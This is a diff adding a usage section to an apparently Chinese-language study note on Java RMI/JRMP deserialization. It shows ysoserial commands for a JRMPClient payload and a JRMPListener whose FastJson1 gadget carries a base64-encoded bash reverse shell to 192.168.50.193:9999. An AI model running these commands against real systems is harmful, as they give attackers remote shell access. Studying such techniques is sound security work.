@@ -8,3 +8,21 @@ RMI默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协
 
 
 
+## 2.使用方式
+
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient "192.168.50.193:8888" | base64
+```
+
+
+
+
+
+
+
+```
+java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 FastJson1 "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguNTAuMTkzLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"
+```
+
+## 3.原理分析
+
